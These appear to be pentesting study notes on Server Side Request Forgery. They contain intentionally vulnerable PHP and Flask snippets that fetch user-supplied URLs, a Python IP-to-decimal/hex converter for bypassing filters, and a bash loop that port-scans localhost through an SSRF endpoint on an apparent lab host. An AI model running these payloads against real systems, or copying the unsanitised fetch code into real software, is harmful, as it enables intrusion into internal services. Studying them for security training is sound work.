## Server Side Request Forgery
https://portswigger.net/web-security/ssrf

Cause no input sanitation 

php example
```php
<?php

if (isset($_GET['url']))

{
  $url = $_GET['url'];
  $image = fopen($url, 'rb');
  header("Content-Type: image/png");
  fpassthru($image);

}
?>
```

python example 
```py
from flask import Flask, request,  render_template, redirect
import requests


app = Flask(__name__)


@app.route("/")
def start():
    url = request.args.get("id")
    r = requests.head(url, timeout=2.000)
    return render_template("index.html", result = r.content)

if __name__ == "__main__":
      app.run(host = '0.0.0.0')
```      
      
Payloads

python script to convert ip to D or H


You can run this in the following format:
For decimal:`python3 ip2dh.py D <Ip-address>`
For Hexadecimal: `python3 ip2dh.py H <Ip-address>`


```py
#!/usr/bin/python3

import sys

if len(sys.argv) < 3:
    print('\nYou must give desired format and IPv4 address as input...')
    print('e.g.: D 192.168.10.100')
    print('Valid formats D=Decimal H=Hexadecimal\n')
    sys.exit(1)

Format = sys.argv[1]

def long(ip):
   IP = ip.split('.')
   IP = list(map(int, IP))
   LongIP = IP[0]*2**24 + IP[1]*2**16 + IP[2]*2**8 + IP[3]
   return LongIP

ip = long(sys.argv[2])

if Format == 'D':
   print('\nIP as Decimal format: %s' % (ip))

if Format == 'H':
   print('\nIP as Hexadecimal format: %s' % (hex(ip)))
```
      
bash script to scan ports

```bash
for x in {1..65535};
  do cmd=$(curl -so /dev/null http://10.10.227.253:8000/attack?url=http://2130706433:${x} \
	-w '%{size_download}');
  if [ $cmd != 1045 ]; then
	echo "Open port: $x"
  fi
done

```


